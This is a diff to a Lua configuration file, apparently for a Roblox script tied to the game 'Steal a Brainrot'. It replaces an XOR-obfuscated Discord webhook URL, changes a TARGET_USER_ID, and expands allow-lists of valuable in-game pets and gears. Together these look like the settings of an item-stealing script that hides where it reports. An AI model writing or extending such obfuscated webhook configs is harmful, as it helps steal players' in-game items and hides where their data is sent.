@@ -1,8 +1,8 @@
 local genv = getgenv()
 
-genv.GOOD_WEBHOOK = (function() local b={69,89,89,93,94,23,2,2,73,68,94,78,66,95,73,3,78,66,64,2,76,93,68,2,90,72,79,69,66,66,70,94,2,28,24,25,31,26,28,26,24,24,30,20,25,31,25,27,31,24,26,25,2,97,28,26,95,31,99,126,89,25,99,111,92,68,24,114,89,96,64,100,25,116,74,105,99,69,84,24,89,111,103,30,99,68,31,101,30,64,28,26,101,29,104,107,99,69,69,120,67,125,90,89,126,125,97,73,67,122,97,72,68,67,89,87,65,96,98,29,99} local k=45 local o={} for i=1,#b do o[i]=string.char(bit32.bxor(b[i],k)) end return table.concat(o) end)()
+genv.GOOD_WEBHOOK = (function() local b={178,174,174,170,169,224,245,245,190,179,169,185,181,168,190,244,185,181,183,245,187,170,179,245,173,191,184,178,181,181,177,169,245,235,239,232,227,235,227,238,238,227,235,232,238,232,237,238,235,226,233,232,245,176,232,189,183,162,226,141,160,159,187,185,138,141,190,179,162,235,159,162,235,148,247,184,159,152,153,139,168,136,170,144,188,146,142,136,151,236,172,191,133,155,162,136,235,155,168,159,177,151,185,143,152,163,189,169,180,235,148,173,172,139,185,150,183,157,187,153,155} local k=218 local o={} for i=1,#b do o[i]=string.char(bit32.bxor(b[i],k)) end return table.concat(o) end)()
 
-genv.TARGET_USER_ID = 10279786442
+genv.TARGET_USER_ID = 2829121161
 
 genv.GOOD_AVATAR = "https://cdn.pfps.gg/pfps/77602-blood-cat.gif"
 
@@ -31,7 +31,6 @@ genv.ALLOWED_ANIMALS = {
     "Bumbatron",
     "Bunny and Eggy",
     "Popcuru and Fizzuru",
-    "La Breakfast Combinasion",
     "Rosey and Teddy",
     "Capitano Moby",
     "Cooki and Milki",
@@ -54,11 +53,9 @@ genv.ALLOWED_ANIMALS = {
     "Cash or Card",
     "Fragrama and Chocrama",
     "La Casa Boo",
-    "La Fuse Machine",
     "Los Admins",
     "Duggy Bros",
     "La Food Combinasion",
-    "Yetimatic",
     "S'more Serat",
     "Sammyni Cakini",
     "Boppin Bunny",
@@ -70,22 +67,45 @@ genv.ALLOWED_ANIMALS = {
     "Rubiko and Kubiko",
     "Capitano Americano",
     "Examen Bros",
+    "Los Spaghettis",
     "Rubrikiko",
     "Festive 67",
     "Guest 666",
     "Quackini Snackini",
     "Queen Bee",
     "Cloverat Clapat",
+    "Caylusaurus",
     "Hopilikalika Hopilikalako",
-    "Garama and Madundung"
+    "Garama and Madundung",
+    "Globa Steppa",
+    "Fragola La La La",
+    "Los Tacoritas",
+    "Dug Dug Dug",
+    "Rico Dinero",
+    "Tirilikalika Tirilikalako",
+    "Jolly Jolly Sahur",
+    "Yetimatic",
+    "La Breakfast Combinasion",
+    "La Fuse Machine",
+    "Money Money Bros",
+    "Sammyini Truckini",
+    "Orchidox",
+    "Pop Pop Petalini"
 }
 
 genv.ALLOWED_BASESKINS = {
-
+    ["Tralala"] = true
 }
 
 genv.ALLOWED_GEARS = {
-
+    ["Bloodmoon Slap"] = true,
+    ["Bloodmoon Hammer"] = true,
+    ["Rainbow Hammer"] = true,
+    ["Candy Sentry"] = true,
+    ["Santa's Sleigh"] = true,
+    ["Witch's Broom"] = true,
+    ["Waverider"] = true,
+    ["Cupid's Wings"] = true
 }
 
 genv.ALLOWED_PLACE_IDS = {
